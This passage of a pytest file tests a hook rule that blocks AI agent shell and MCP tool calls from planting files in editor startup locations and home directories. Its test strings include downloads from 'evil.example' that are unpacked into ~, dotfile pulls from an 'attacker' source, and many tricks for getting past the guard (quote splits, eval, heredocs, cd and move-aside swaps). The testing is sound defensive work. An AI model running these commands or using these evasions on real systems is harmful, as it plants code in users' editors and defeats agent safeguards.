    "cd /tmp && tar xf a.tgz", "sudo cp app.conf /etc/nginx/",
])
def test_r4_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


@pytest.mark.parametrize("tool,args", [
    ("mcp__codex__write_stdin", {"session_id": 3, "chars": "echo x >> ~/.vimrc\n"}),
    ("mcp__pty__write", {"data": "echo x >> ~/.vimrc\n"}),
    ("mcp__x__stdin_write", {"content": "cp x ~/.vimrc"}),
    ("mcp__x__task_create", {"exec": "echo x >> ~/.vimrc"}),
    ("mcp__x__start", {"entrypoint": "sh", "argv_list": ["-c", "echo x >> ~/.vimrc"]}),
    ("mcp__x__invoke", {"binary": "sh", "parameters": ["-c", "cp x ~/.vimrc"]}),
    ("mcp__computer__type", {"text": "echo x >> ~/.vimrc\n"}),
    ("mcp__x__invoke", {"binary": "cp", "parameters": ["x", "~/.(e)macs"]}),
])
def test_r4_mcp_gated(tool, args):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), tool


def test_r4_mcp_cwd_relative_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file", action=ActionClass.MCP,
                    cwd="/home/u/.config/nvim", args={"path": "plugin/x.lua", "content": "x"})
    assert _ours(evaluate(ev, EMPTY))


@pytest.mark.parametrize("tool,args", [
    ("mcp__db__run_query", {"query": "insert into notes values ('~/.vimrc')"}),
    ("mcp__supabase__execute_sql", {"query": "insert into t values ('cp x ~/.vimrc')"}),
    ("mcp__x__process_payment", {"note": "~/.vimrc"}),
    ("mcp__puppeteer__evaluate", {"script": "document.querySelector('.vim')"}),
    ("mcp__github__create_or_update_file", {"path": ".vimrc", "content": "x"}),
])
def test_r4_mcp_false_positives_fixed(tool, args):
    assert evaluate(_mcp(args, tool=tool), EMPTY).rule != RULE, tool


def test_r4_allow_respects_cwd_and_zsh_groups():
    pol = Policy(editor_startup={"allow": ["/dotfiles/"]})
    ev = _sh_cwd("cp x ~/dotfiles/.vimrc && cp x init.lua", "/home/u/.config/nvim")
    assert _ours(evaluate(ev, pol))
    assert _ours(evaluate(_shell("cp x ~/dotfiles/.vimrc && cp x ~/.(e)macs"), pol))


@pytest.mark.parametrize("cmd", [
    "sudo -u root cp /tmp/vimrc /etc/", "sudo -E -u root mv /tmp/nvim /etc/xdg/",
    "env FOO=1 cp -r /tmp/nvim ~/.config/", "nohup cp -r /tmp/emacs /etc/ &",
])
def test_r4_prefixed_placement_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


# ---- QA round 5 regressions ---------------------------------------------------

@pytest.mark.parametrize("cmd", [
    # redirections / comments taken as destination
    "cp -r /tmp/nvim ~/.config 2>/dev/null", "cp -r /tmp/nvim ~/.config >/dev/null 2>&1",
    "cp -r /tmp/nvim ~/.config </dev/null", "cp -r /tmp/nvim ~/.config>/dev/null",
    "cp -r /tmp/nvim ~/.config # copy", "cp -a /tmp/dot/. ~ #",
    # inner shells / quote splits
    "bash -c 'cp -r /tmp/nvim ~/.config/'", "sh -c 'cp -r /tmp/nvim ~/.config/'",
    "c''p -r /tmp/nvim ~/.config/", "cd ~/.config && bash -c 'cp -r /tmp/nvim .'",
    # clustered -t
    "cp -rt ~/.config /tmp/nvim", "mv -ft ~/.config /tmp/nvim", "cp -rvt ~/.config /tmp/nvim",
    "ln -sfnt ~/.config ~/dot/nvim", "cp -rt ~ /tmp/dot/.",
    "echo /tmp/nvim | xargs -n1 cp -rt ~/.config",
    # git clone value options
    "cd ~/.config && git clone --depth 1 https://e/x/nvim",
    "cd ~/.config && git clone -b main https://e/x/nvim",
    "cd ~/.config && git clone -c k=v https://e/x/nvim",
    "cd ~/.config && git clone https://e/x/nvim --depth 1",
    "git -C ~/.config clone --depth 1 https://e/x/nvim",
    "gh repo clone x/nvim ~/.config/nvim", "hg clone https://e/x ~/.config/nvim",
    "svn checkout https://e/x ~/.config/nvim",
    # substitutions / subshells
    "x=$(cp -r /tmp/nvim ~/.config/)", "echo `cp -r /tmp/nvim ~/.config/`",
    "(cp -r /tmp/nvim ~/.config/)", "(tar xf /tmp/d.tgz -C ~)",
    "(cd ~ && tar xf /tmp/d.tgz)", "cd ~ && (tar xf /tmp/d.tgz)",
    # wrappers
    "timeout 5 cp -r /tmp/nvim ~/.config/", "nice -n 10 cp -r /tmp/nvim ~/.config/",
    "stdbuf -o0 cp -r /tmp/nvim ~/.config/", "time -p cp -r /tmp/nvim ~/.config/",
    "busybox cp -r /tmp/nvim ~/.config/", "command -p cp -r /tmp/nvim ~/.config/",
    "sudo -nu root cp -r /tmp/nvim /etc/xdg/", "sudo -R /x cp -r /tmp/nvim /etc/xdg/",
    "sudo -T 5 cp -r /tmp/nvim /etc/xdg/", "env -C /home/u/.config cp -r /tmp/nvim .",
    "env -S 'cp -r /tmp/nvim /home/u/.config/'", "FOO=\"a b\" cp -r /tmp/nvim ~/.config/",
    "eval 'cp -r /tmp/nvim ~/.config/'", "eval cp -r /tmp/nvim ~/.config/",
    "find /tmp -name nvim -exec cp -r {} ~/.config \\;",
    # cwd tracking
    "cd ~; cd /nonexistent 2>/dev/null; tar xf /tmp/d.tgz",
    "cd ~ && cd /tmp | cat; tar xf /tmp/d.tgz",
    "cd ~ && pushd /tmp && popd && tar xf /tmp/d.tgz",
    "cd ~ && if false; then cd /tmp; fi; tar xf /tmp/d.tgz",
    # PowerShell / cmd
    "Copy-Item -Path C:\\t\\nvim -Destination $env:LOCALAPPDATA -Recurse",
    "Copy-Item -Path C:\\t\\nvim -Destination \"$env:LOCALAPPDATA\" -Recurse",
    "Expand-Archive x.zip $env:LOCALAPPDATA",
    "xcopy /E /I C:\\t\\nvim %LOCALAPPDATA%\\nvim\\",
    "robocopy C:\\t\\nvim %LOCALAPPDATA%\\nvim /E",
    # misc low
    "cp --parents nvim/init.lua ~/.config", "cp -r --targ=$HOME/.config /tmp/nvim",
    "mv --t ~/.config /tmp/nvim", "cd ~/.config && patch -p0 < x.diff",
])
def test_r5_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("cmd", [
    "cd ~ && mv *.log logs/", "cd ~ && cp *.pdf Documents/", "cd ~ && cp proj/* /tmp/",
    "cd ~ && rsync -a proj/ /tmp/proj/", "cd ~ && cp -r . /tmp/home-bk",
    "cat > gen.py <<'EOF'\n" + "print(1)\n" * 450 + "EOF\n",
    "\n".join(["echo hi"] * 401),
    "git commit -m '" + "line\n" * 420 + "'",
    "cd pkgroot && cp -r etc/* /tmp/stage/etc/",
    "make install PREFIX=/usr/local", "sudo install -m755 bin/app /usr/local/bin/",
    "sudo tar -C /usr/local -xzf go1.22.linux-amd64.tar.gz",
    "git clone https://github.com/x/nvim ~/code/nvim", "cp -r src/ build/",
    "mv report.pdf ~", "cp config.yaml ~/.config/myapp/",
    "cd /repo && git apply fix.diff", "cd /repo && patch -p1 < fix.diff",
])
def test_r5_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd[:80]


@pytest.mark.parametrize("args", [
    {"command": ["cp", "-r", "/tmp/nvim", "/home/u/.config/"]},
    {"command": "cp", "args": ["-r", "/tmp/nvim", "/home/u/.config/"]},
    {"program": "cp", "arguments": ["-r", "/tmp/nvim", "/home/u/.config/"]},
    {"executable": "tar", "args": ["xf", "/tmp/d.tgz", "-C", "/home/u"]},
    {"command": "cp -r /tmp/nvim .", "cwd": "/home/u/.config"},
    {"command": "cp -r /tmp/nvim .", "workdir": "/home/u/.config"},
])
def test_r5_mcp_runner_argv_and_cwd(args):
    assert _ours(evaluate(_mcp(args, tool="mcp__shell__run_command"), EMPTY)), args


@pytest.mark.parametrize("tool,args", [
    ("mcp__memory__create_entities", {"entities": [{"obs": "cp -r ~/dot/nvim ~/.config/"}]}),
    ("mcp__notion__notion-create-pages", {"content": "cp -r ~/dot/nvim ~/.config/"}),
    ("mcp__google-drive__create_file", {"content": "cp -r ~/dot/nvim ~/.config/"}),
    ("mcp__context7__get-library-docs", {"topic": "init.lua in ~/.config/nvim"}),
])
def test_r5_mcp_remote_false_positives_fixed(tool, args):
    assert evaluate(_mcp(args, tool=tool), EMPTY).rule != RULE, tool


@pytest.mark.parametrize("cmd", [
    "cp -a /tmp/d/. " + "x/" * 190000,
    ("cd " + "x/" * 450 + ";") * 399 + "cp -a /tmp/d/. .",
    "cp -a /tmp/d/. " + "share/" * 60000,
])
def test_r5_perf_bounded(cmd):
    import time
    ev = _shell(cmd)
    t = time.time()
    rules.rule_editor_startup_protect(ev, EMPTY)
    assert time.time() - t < 2.0


# ---- QA round 6 regressions ---------------------------------------------------

PL = "cd ~/.config; cp -r /tmp/x/nvim ."


@pytest.mark.parametrize("cmd", [
    "echo $((1<<2))\n" + PL, "((x<<=1))\n" + PL, "echo ${x#<<}\n" + PL,
    "echo $((1<<2))\ntar xzf /tmp/x.tgz -C ~", "echo $((1<<2))\nrsync -a /tmp/d/ ~/",
    "cat <<E\"O\"F\nEOF\n" + PL, "cat <<E'O'F\nEOF\n" + PL, "cat <<\"EOF\"x\nEOFx\n" + PL,
    "echo \"`cd ~/.config && cp -r /tmp/x/nvim .`\"", "echo \"`tar xzf /tmp/x.tgz -C ~`\"",
    "cat <<EOF\n$(cd ~/.config; cp -r /tmp/x/nvim .)\nEOF",
    "cat <<EOF\n`tar xzf /tmp/x.tgz -C ~`\nEOF",
    "cat <<EOF\nnever closed\n" + PL,
    "echo it\\'s mi; " + PL, "echo C:\\\\x; echo it\\'s; " + PL,
    "cp /tmp/x ~/.$'\\u76'imrc", "cp /tmp/x ~/.$'\\x{76}'imrc",
    "cp -r /tmp/x ~/.config/n$'\\u76'im",
    "tar -xzC ~ -f /tmp/n.tgz", "tar -xzvC ~/.config -f x", "bsdtar -xC ~ -f x",
    "tar xzfC /tmp/n.tgz ~", "unzip -od ~ x.zip", "unzip -qod ~ x.zip",
    "coproc cp -r /tmp/nvim ~/.config", "jar xf x.jar && cd ~ && jar xf /tmp/x.jar",
    "cd ~ && ar x /tmp/x.a",
])
def test_r6_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("args", [
    {"command": "mv /tmp/nvim .", "workingDir": "~/.config"},
    {"command": "mv /tmp/nvim .", "working_dir": "~/.config"},
    {"command": "mv /tmp/nvim .", "current_dir": "~/.config"},
    {"command": "mv /tmp/nvim .", "options": {"cwd": "~/.config"}},
])
def test_r6_mcp_cwd_keys(args):
    assert _ours(evaluate(_mcp(args, tool="mcp__shell__run_command"), EMPTY)), args


def test_r6_remote_server_name_collision_still_judged():
    assert _ours(evaluate(_mcp({"command": "cp /tmp/x ~/.vimrc"},
                               tool="mcp__memory__run_command"), EMPTY))


@pytest.mark.parametrize("ev", [
    _shell("git -C ~/.config/nvim log"),
    _mcp({"query": "crash in ~/.config/nvim/init.lua"}, tool="mcp__sentry__search_issues"),
    _mcp({"repo_path": "/repo", "message": "update ~/.vimrc docs"}, tool="mcp__git__git_commit"),
])
def test_r6_false_positives_fixed(ev):
    assert evaluate(ev, EMPTY).rule != RULE


def test_r6_cd_star_blowup_bounded():
    import time
    cmd = "; ".join(f"cd d{i}" for i in range(100)) + "; cp " + " ".join(["*"] * 200) \
        + " out; cp /tmp/x ~/.vimrc"
    t = time.time()
    d = rules.rule_editor_startup_protect(_shell(cmd), EMPTY)
    assert time.time() - t < 2.0 and _ours(d)


# ---- QA round 7 regressions ---------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cd ~ && git init && git remote add o https://x/dots && git pull o main",
    "git --work-tree=$HOME --git-dir=$HOME/.dots checkout -f",
    "git --work-tree ~ --git-dir ~/.dots checkout",
    "git -C ~ pull", "git -C ~/.config pull", "cd ~/.config && git pull https://x/dots main",
    "cd ~ && git checkout o/main -- .", "cd ~ && git merge o/main",
    "cd ~ && git restore --source=o/main .", "cd ~ && git switch -f main",
    "cd ~ && git stash pop", "cd ~ && git apply /tmp/x.patch", "cd ~ && git am /tmp/x.mbox",
    "GIT_WORK_TREE=$HOME git --git-dir=$HOME/.dots checkout",
    "chezmoi init --apply attacker", "chezmoi apply", "yadm clone https://x/dots",
    "yadm checkout -f",
    "cd ~/.c?nfig && echo x > nvim/init.lua", "cd ~/.conf* && cp /tmp/x nvim/init.lua",
    "cd ~/.[c]onfig && cp /tmp/x nvim/init.lua", "cd ~/.conf* && git clone https://x/y nvim",
    "cd ~/.conf* && mv /tmp/nvim .", "cd /e?c && echo x >> vimrc",
    "cp -aT /tmp/dots ~", "cp -rT /tmp/cfg ~/.config", "cp --no-target-directory -r /tmp/dots ~",
    "ditto /tmp/dots ~", "xcopy /E /I C:\\tmp\\dots %USERPROFILE%",
    "cd ~/.config && wget -nH -r https://x/nvim/", "cd ~ && wget -r -nH https://x/",
    "scp -r host:nvim ~/.config/", "cd ~/.config && scp -r host:nvim .", "scp -r host:dots/* ~/",
    "svn export https://x/dots ~ --force", "npx degit user/dots ~ --force",
    "rclone copy remote:dots ~", "aws s3 sync s3://b/dots ~",
    "docker cp c:/root/. ~", "kubectl cp ns/pod:/root/. ~",
    "unsquashfs -f -d ~ x", "cabextract -d ~ x",
    "python3 -m zipfile -e x.zip ~", "python3 -m tarfile -e x.tgz ~",
    ": ${x:=$(tar xzf /tmp/x.tgz -C ~)}", "echo $(( $(tar xzf /tmp/x.tgz -C ~) ))",
    "echo x >> ~/.vimrc.local",
])
def test_r7_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


def test_r7_git_pull_in_home_cwd_gated():
    assert _ours(evaluate(_sh_cwd("git pull https://x/dots main", "/home/u"), EMPTY))
    assert _ours(evaluate(_sh_cwd("git pull https://x/dots main", "/home/u/.config"), EMPTY))


@pytest.mark.parametrize("tool", [
    "mcp__text-editor__search_replace", "mcp__text_editor__search_replace",
    "mcp__code__search_and_replace", "mcp__ide__search_replace_block",
    "mcp__editor__apply_search_replace", "mcp__codesearch__search_and_edit",
])
def test_r7_search_named_editors_gated(tool):
    ev = _mcp({"file_path": "/home/u/.config/nvim/init.lua", "search": "a", "replace": "b"},
              tool=tool)
    assert _ours(evaluate(ev, EMPTY)), tool


@pytest.mark.parametrize("tool", [
    "mcp__runner__run_command_with_logs", "mcp__task__run_and_log",
    "mcp__process__start_process_log",
])
def test_r7_log_named_runners_gated(tool):
    ev = _mcp({"command": "cp /tmp/x ~/.config/nvim/init.lua"}, tool=tool)
    assert _ours(evaluate(ev, EMPTY)), tool


def test_r7_mcp_cwd_exact_key_preferred():
    ev = _mcp({"logdir": "/tmp", "cwd": "/home/u/.config", "command": "cp /tmp/x nvim/init.lua"},
              tool="mcp__shell__run_command")
    assert _ours(evaluate(ev, EMPTY))


def test_r7_mcp_relative_path_with_cwd():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__serena__create_text_file",
                    action=ActionClass.MCP, cwd="/home/u/.config/nvim",
                    args={"relative_path": "init.lua", "content": "x"})
    assert _ours(evaluate(ev, EMPTY))


@pytest.mark.parametrize("ev", [
    _mcp({"url": "https://github.com/x/.vimrc"}, tool="mcp__fetch__fetch"),
    _mcp({"thought": "run cp -r ~/dot/nvim ~/.config/nvim later"},
         tool="mcp__sequential-thinking__think"),
    _shell("cd /repo && git pull"), _shell("cd /repo && git checkout -b feat"),
    _shell("git stash list"), _shell("git reset HEAD~1"),
    _shell("aws s3 sync ./build s3://bucket/site"), _shell("docker cp ./app c:/app"),
    _shell("wget https://x/y.tgz"), _shell("rclone copy ./out remote:bk"),
])
def test_r7_false_positives_fixed(ev):
    assert evaluate(ev, EMPTY).rule != RULE


# ---- QA round 8 regressions ---------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "curl -sLo /tmp/d.zip https://evil.example/d.zip && cd ~ && unzip -o /tmp/d.zip",
    "cd ~/.config && curl -sLO https://evil.example/nvim.zip && unzip -o nvim.zip",
    "cd ~ && unzip -o -q /tmp/d.zip", "cd ~ && unzip -q -o /tmp/d.zip",
    "cd ~ && tar -x -o -f /tmp/d.tar", "cd ~ && bsdtar -x -o -f /tmp/d.tar",
    "cd ~ && cpio -i -d -m < x.cpio",
    "aws --no-sign-request s3 sync s3://evil/d ~", "aws --region us-east-1 s3 sync s3://d ~",
    "aws --profile x s3 sync s3://b/d ~", "rclone -v copy r:d ~", "rclone --config x copy r:dots ~",
    "kubectl -n ns cp pod:/x ~", "kubectl --namespace ns cp p:/d ~",
    "docker --context x cp c:/d/. ~", "docker container cp ctr:/x/nvim ~/.config/",
    "kubectl cp pod:/root/dots ~",
    "pnpm dlx degit u/d ~", "yarn dlx degit u/d ~", "bun x degit u/d ~/.config",
    "wget -rP ~ https://x/", "python3 -I -m zipfile -e a.zip ~",
    "export GIT_WORK_TREE=$HOME; git checkout -f", "git -c core.worktree=$HOME checkout -f",
    "copier copy gh:u/t ~", "cookiecutter gh:u/t -o ~", "npx giget@latest gh:u/dots ~",
])
def test_r8_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


def test_r8_unzip_o_with_home_cwd_gated():
    assert _ours(evaluate(_sh_cwd("unzip -o d.zip", "/home/user"), EMPTY))
    assert _ours(evaluate(_mcp({"command": "cd ~ && unzip -o /tmp/d.zip"},
                               tool="mcp__desktop-commander__start_process"), EMPTY))


@pytest.mark.parametrize("cmd", [
    "cd proj && git pull", "cd /home/user/proj && git checkout main",
    "cd proj && git stash pop", "cd proj && git apply ../fix.patch",
    "git clone https://github.com/a/b.git && cd b && git checkout v1.2",
    "cd ~/src/app && git checkout main", "cd proj && tar xzf ../a.tgz",
    "cd proj && unzip a.zip", "cd proj && rsync -a ../x/ ./",
    "cd proj && aws s3 sync s3://b/data .", "cd /tmp && unzip ~/Downloads/a.zip",
])
def test_r8_home_session_cwd_false_positives_fixed(cmd):
    assert evaluate(_sh_cwd(cmd, "/home/user"), EMPTY).rule != RULE, cmd


def test_r8_failed_cd_evasion_still_gated_with_semicolon():
    assert _ours(evaluate(_shell("cd ~; cd /nonexistent 2>/dev/null; tar xf /tmp/d.tgz"), EMPTY))


def test_r8_mcp_git_checkout_in_home_gated():
    assert _ours(evaluate(_mcp({"repo_path": "/home/user", "branch_name": "main"},
                               tool="mcp__git__git_checkout"), EMPTY))
    assert evaluate(_mcp({"repo_path": "/home/user/proj", "branch_name": "main"},
                         tool="mcp__git__git_checkout"), EMPTY).rule != RULE


@pytest.mark.parametrize("ev", [
    _mcp({"path": "/repo/README.md", "edits": [{"oldText": "a",
          "newText": "echo 'set nu' >> ~/.vimrc"}]}, tool="mcp__filesystem__edit_file"),
    _mcp({"command": "git pull", "log_dir": "/home/user"}, tool="mcp__x__run_command"),
])
def test_r8_mcp_false_positives_fixed(ev):
    assert evaluate(ev, EMPTY).rule != RULE


# ---- QA round 9 regressions ---------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cd ~/.config && cd /tmp && cd - && cp -r /tmp/p/. .",
    "cd ~/.config && cd /tmp && cd - >/dev/null && cp -r /tmp/p/. .",
    "cd ~/.config && cd /tmp && builtin cd - && cp -r /tmp/p/. .",
    "cd ~/.config && cd /tmp && cd \"$OLDPWD\" && cp -r /tmp/p/. .",
    "cd ~/.config && cd \"$(mktemp -d)\" && cd - && rsync -a /tmp/p/ .",
    "cd ~/.config && (cd /tmp) && cp -r /tmp/p/. .",
    "cd ~/.config && x=$(cd /tmp) && cp -r /tmp/p/. .",
    "cd ~/.config && cd /nonexistent && : || cp -r /tmp/p/. .",
    "cd ~/.config && cd /nope && echo hi || rsync -a /tmp/p/ .",
    "cd ~/.config && cd /nope && : || unzip -o /tmp/x.zip",
    "cd ~ && cd /nope && : || git pull",
    "cd ~/.config && ! cd /nope && cp -r /tmp/p/. .",
    "cd ~/.config && { cd /nope && :; } ; cp -r /tmp/p/. .",
    "cd ~/.config && npx degit evil/cfg", "cd ~/.config && degit x/y --force",
    "cd ~ && npx tiged x/y", "cd ~/.config && npx giget gh:x/nvim",
    "cookiecutter gh:x/y --output-dir=$HOME/.config", "cd ~/.config && cookiecutter gh:x/y",
    "python3 -Im zipfile -e x.zip ~/",
])
def test_r9_shell_gated(cmd):
    assert _ours(evaluate(_sh_cwd(cmd, "/home/user/proj"), EMPTY)), cmd


@pytest.mark.parametrize("tool,args", [
    ("mcp__term__write_input", {"uri": "term://1", "input": "cd ~/.config && cp -r /tmp/p/. .\n"}),
    ("mcp__term__write_input", {"file": "/dev/pts/1", "input": "cd ~/.config && cp -r /tmp/p/. .\n"}),
    ("mcp__git__git_pull", {"repo": "~"}), ("mcp__git__git_pull", {"working_dir": "~"}),
    ("mcp__x__run_command", {"command": "tar xf x.tgz", "cwd_path": "~"}),
    ("mcp__x__run_command", {"command": "tar xf x.tgz", "location": "~"}),
])
def test_r9_mcp_gated(tool, args):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), (tool, args)


@pytest.mark.parametrize("cmd", [
    "npx degit sveltejs/template web", "pushd src && make && popd",
    "cd ~/.config/nvim && git status", "cd .. && ls", "cd build && cmake .. && make",
])
def test_r9_false_positives(cmd):
    assert evaluate(_sh_cwd(cmd, "/home/user/proj"), EMPTY).rule != RULE, cmd


# ---- QA round 10 regressions --------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cp -r .config ~/", "cp -r .config/ ~/", "rsync -av .config ~/",
    "cp -r dotfiles/.config ~/", "cp -a /tmp/d/.config /home/u/",
    "git clone https://github.com/x/dots /tmp/d && cp -r /tmp/d/.config ~/",
    "sudo cp -r /tmp/d/etc /", "cp -r /tmp/d/AppData ~", "docker cp c1:/root/.config ~/",
    "mv ~/.config ~/.config.bak && ln -s ~/proj/.config ~/.config",
    "ln -s ~/.config c && echo x > c/nvim/plugin/x.lua",
    "ln -s /home/u/.local/share s && cp -r p s/nvim/site/",
    "python3.12 -m zipfile -e a.zip ~", "uv run python -m zipfile -e a.zip ~",
    "python3 -X utf8 -m zipfile -e a.zip ~", "python3 -W ignore -m tarfile -e a.tgz ~",
    "dpkg -x evil.deb ~", "dpkg-deb -x evil.deb ~",
    "echo x > ~/.config/lvim/config.lua", "echo x > ~/.config/nvim-kickstart/init.lua",
    "echo x > ~/.config/astronvim/init.lua",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj", "/home/u"])
def test_r10_shell_gated(cmd, cwd):
    assert _ours(evaluate(_sh_cwd(cmd, cwd), EMPTY)), (cmd, cwd)


@pytest.mark.parametrize("cmd", [
    "true | cd /tmp && tar xf /tmp/evil.tgz", "cd /tmp && true & tar xf /tmp/evil.tgz",
    "cd /tmp && sleep 0 & git pull", "CDPATH=/home cd u && tar xf /tmp/x.tgz",
    "pushd /tmp && pushd +1 && tar xf /tmp/x.tgz", "cd \"$PWD\" && tar xf /tmp/x.tgz",
    "cmake -E tar xf x.tgz",
])
def test_r10_home_cwd_narrowing_gaps_gated(cmd):
    assert _ours(evaluate(_sh_cwd(cmd, "/home/u"), EMPTY)), cmd


def test_r10_mcp_move_into_gated_parent():
    assert _ours(evaluate(_mcp({"source": "/tmp/d/.config", "destination": "/home/u/.config"},
                               tool="mcp__filesystem__move_file"), EMPTY))


@pytest.mark.parametrize("ev", [
    _sh_cwd("cd .. && git checkout main", "/home/u/proj/web"),
    _sh_cwd("cd ..; git stash pop", "/home/u/proj/web"),
    _mcp({"command": "cd .. && git pull", "cwd": "/home/u/proj/web"},
         tool="mcp__x__execute_command"),
    _mcp({"relative_path": "src/a.py", "regex": "x", "repl": "cp a ~/.vimrc"},
         tool="mcp__serena__replace_regex"),
    _sh_cwd("cp -r src ~/backup/", "/home/u/proj"),
    _sh_cwd("ln -s ~/dotfiles/starship.toml ~/.config/starship.toml", "/home/u"),
    _sh_cwd("cp -r build/dist ~/", "/home/u/proj"),
])
def test_r10_false_positives_fixed(ev):
    assert evaluate(ev, EMPTY).rule != RULE


# ---- QA round 11 regressions --------------------------------------------------

NOHOME = "/home/nonexistent-qa-user"


@pytest.mark.parametrize("cmd", [
    "ln -s $HOME/.config c && echo 'vim.fn.system(\"id\")' > c/nvim/plugin/x.lua",
    "ln -s \"$HOME/.config\" c && git clone https://github.com/a/b c/nvim",
    "ln -s ${HOME}/.config c && cp -r /tmp/b/nvim c/",
    "ln -sfn \"$HOME/.config\" cfg && mkdir -p cfg/nvim/plugin && cp /tmp/x.lua cfg/nvim/plugin/",
    "ln -s $HOME h && cp -r /tmp/b/. h/", "ln -s ~/. h && cp -r /tmp/b/. h/",
    f"git clone https://github.com/a/evil /tmp/evil && cp -r /tmp/evil {NOHOME}/.config",
    f"cp -r /tmp/evil {NOHOME}/.config/", f"mv /tmp/evil {NOHOME}/.config",
    f"ln -s /tmp/evil {NOHOME}/.config", f"ln -sfn /tmp/evil {NOHOME}/.config",
    "git clone https://github.com/a/b /tmp/b && bash -c -- 'cp -r /tmp/b/. ~'",
    "bash -c -e 'cp -r /tmp/b/* ~/.config/'", "bash -c +x 'tar xzf /tmp/x.tgz -C ~'",
    "bash -c -- 'ln -s ~/.config c && cp /tmp/x c/nvim/init.lua'",
    "echo 'cp -r /tmp/b/. ~' | sh", "sh -s <<< 'cp -r /tmp/b/. ~'",
    "su -c 'cp -r /tmp/b/. ~'",
    "sudo tar xf x.tgz -C /", "cd / && sudo tar xf r.tgz", "sudo cp -a overlay/. /",
    "rsync -a stage/ /usr/",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj"])
def test_r11_shell_gated(cmd, cwd):
    assert _ours(evaluate(_sh_cwd(cmd, cwd), EMPTY)), (cmd[:80], cwd)


def test_r11_word_cap_fails_closed():
    cmd = "tar xzf /tmp/x.tgz " + "-v " * 4001 + "-C ~"
    assert _ours(rules.rule_editor_startup_protect(_shell(cmd), EMPTY))


def test_r11_relative_ln_target_resolved_against_link_dir():
    cmd = ("git clone https://github.com/a/dots /tmp/b && mkdir -p d && "
           "ln -s ../.. d/h && cp -r /tmp/b/. d/h/")
    assert _ours(evaluate(_sh_cwd(cmd, "/home/u/proj"), EMPTY))


@pytest.mark.parametrize("cmd", [
    "cd proj && git pull 2>&1 | tail -5", "cd proj && git pull | tee pull.log",
    "cd proj && git checkout -b feature && git log --oneline | head",
    "cd proj && git merge main 2>&1 | grep CONFLICT", "cd ~/proj && git pull | cat",
    "cd proj && tar xzf data.tgz | head", "cd proj && bash -c 'git pull'",
    "cd proj && sh -c 'tar xzf data.tgz'", "cd .. && git checkout \"main\"",
])
def test_r11_home_cwd_false_positives_fixed(cmd):
    assert evaluate(_sh_cwd(cmd, "/home/u"), EMPTY).rule != RULE, cmd


@pytest.mark.parametrize("cmd", [
    "cp -r build/share /usr/local/", "sudo cp -r bin lib include /usr/local/",
    "cp -r lib /usr/local/", "ln -s /opt/homebrew/share share",
    "sudo tar -C /usr/local -xzf go1.22.linux-amd64.tar.gz",
])
def test_r11_prefix_install_false_positives_fixed(cmd):
    assert evaluate(_sh_cwd(cmd, "/home/u/proj"), EMPTY).rule != RULE, cmd


# ---- QA round 12 regressions --------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "mv ~/.config /tmp/o && mv /tmp/payload ~/.config",
    "mv ~/.config /tmp/o && cp -r /tmp/payload ~/.config",
    "mv ~/.config /tmp/o; mv /tmp/payload ~/.config",
    "mv $HOME/.config /tmp/o && ln -s /tmp/payload $HOME/.config",
    "mv ~ /tmp/oldhome && mv /tmp/newhome ~",
    "trash-put ~/.config && cp -r /tmp/payload ~/.config",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj", "/home/u"])
def test_r12_move_aside_swap_gated(cmd, cwd):
    d = evaluate(_sh_cwd(cmd, cwd), EMPTY)
    assert d.action != Action.ALLOW, (cmd, cwd)
    assert _ours(rules.rule_editor_startup_protect(_sh_cwd(cmd, cwd), EMPTY)), (cmd, cwd)


@pytest.mark.parametrize("cmd", [
    "bash -c 'cd /tmp && git pull'", "bash -c 'cd /home/u/proj && git pull'",
    "mv ~/.config/foo.bak ~/.config/foo", "mv build/out ~/newdir",
    "mv old.txt new.txt && mv dir1 ~/Documents/",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj", "/home/u"])
def test_r12_false_positives(cmd, cwd):
    assert evaluate(_sh_cwd(cmd, cwd), EMPTY).rule != RULE, (cmd, cwd)


# ---- QA round 13 regressions --------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "eval 'cd ~ && tar xf /tmp/x.tgz'", "eval \"cd ~/.config && unzip -o /tmp/n.zip\"",
    "eval 'cd ~/.config && cp -r /tmp/nvim .'", "eval 'cd ~/.config; git clone https://x/nvim'",
    "eval 'cd ~ && git pull https://x/dots main'", "builtin eval 'cd ~ && tar xf /tmp/x.tgz'",
    "command eval 'cd ~ && tar xf /tmp/x.tgz'", "eval cd ~ '&&' tar xf /tmp/x.tgz",
    "cd ~ && mv .config /tmp/o && mv /tmp/p ~/.config",
    "mv ~/.config{,.bak} && mv /tmp/p ~/.config",
    "mv ~/.config{,.old} && cp -r /tmp/p ~/.config",
    "mv ~/.conf* /tmp/o && mv /tmp/p ~/.config", "mv ~/.conf?g /tmp/o && mv /tmp/p ~/.config",
    "bash <<'EOF'\ncp -r /tmp/nvim ~/.config/\nEOF",
    "bash <<'EOF'\ncd ~\ntar xf /tmp/x.tgz\nEOF",
    "sh <<EOF\nrsync -a /tmp/p/ ~/\nEOF", "bash -s <<'EOF'\ncp -r /tmp/p/. ~\nEOF",
    "cat <<'EOF' | bash\ncp -r /tmp/p/. ~\nEOF",
    "bash <<'EOF'\nmv ~/.config /tmp/o && mv /tmp/p ~/.config\nEOF",
    "tar xf /tmp/x.tgz -C $\"$HOME\"", "cd ~/$\".config\" && tar xf /tmp/x.tgz",
